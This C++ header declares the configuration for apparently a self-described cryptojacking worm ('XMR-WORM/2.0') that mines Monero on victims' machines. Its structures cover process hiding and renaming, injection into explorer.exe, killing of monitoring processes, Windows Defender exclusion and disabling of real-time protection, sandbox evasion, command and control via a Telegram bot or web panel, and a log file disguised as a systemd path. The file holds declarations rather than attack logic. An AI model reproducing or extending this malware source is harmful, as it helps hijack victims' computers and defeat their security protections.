#ifndef XMR_CONFIG_H
#define XMR_CONFIG_H

#include <map>
#include <nlohmann/json.hpp>
#include <string>
#include <vector>
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <thread>
#include <functional>
#include <stdexcept>


    namespace XMR {

  struct MiningConfig {
    int max_threads = 0;
    int reserved_cores = 1;
    int max_cpu_usage = 85;
    struct RandomX {
      bool enabled = true;
      bool huge_pages = true;
      bool jit = true;
      bool avx512 = false;
      int cache_size_mb = 2080;
      int init_timeout_seconds = 30;
    } randomx;
    struct GPU {
      bool enabled = false;
      std::string platform = "cuda";
      int device_id = 0;
      int threads_per_block = 256;
    } gpu;
  };

  struct NetworkConfig {
    std::vector<std::map<std::string, std::string>> pools;
    std::string wallet;
    std::string password = "x";
    std::string user_agent = "XMR-WORM/2.0";
    int connection_timeout = 30;
    int read_timeout = 60;
    int reconnect_delay = 5;
    int max_reconnect_attempts = 10;
    struct SSL {
      bool enabled = false;
      bool verify_certificate = false;
    } ssl;
    struct Tor {
      bool enabled = false;
      std::string socks5_host = "127.0.0.1";
      int socks5_port = 9050;
      int new_identity_interval = 0;
    } tor;
  };

  struct StealthConfig {
    bool hide_process = true;
    std::vector<std::string> process_names;
    int rename_interval_seconds = 300;
    struct ProcessInjection {
      bool enabled = false;
      std::string target = "explorer.exe";
      std::string method = "remote_thread";
    } process_injection;
    struct Watchdog {
      bool enabled = true;
      int check_interval = 5;
      std::vector<std::string> kill_processes;
      bool pause_on_detection = true;
    } watchdog;
    bool idle_detection = true;
    int idle_threshold_seconds = 300;
    struct DefenderBypass {
      bool enabled = false;
      bool add_exclusion = true;
      bool disable_realtime = false;
    } defender_bypass;
    bool sandbox_detection = true;
    bool sandbox_exit = true;
  };

  struct RemoteConfig {
    bool enabled = false;
    std::string url;
    std::string auth_token;
    int update_interval = 600;
  };

  struct C2Config {
    struct Telegram {
      bool enabled = false;
      std::string bot_token;
      std::string chat_id;
    } telegram;
    struct WebPanel {
      bool enabled = false;
      std::string url;
      std::string api_key;
    } web_panel;
  };

  struct AdvancedConfig {
    std::string log_file = "/tmp/.systemd-private-xxxxx";
    int stats_report_interval = 60;
    bool auto_update = false;
    std::string update_url;
  };

  struct Config {
    MiningConfig mining;
    NetworkConfig network;
    StealthConfig stealth;
    RemoteConfig remote_config;
    C2Config c2;
    AdvancedConfig advanced;

    static Config load_from_file(const std::string &path);
    static Config from_json(const nlohmann::json &j);
    bool validate() const;
    void save_to_file(const std::string &path);
  };

} // namespace XMR

#endif
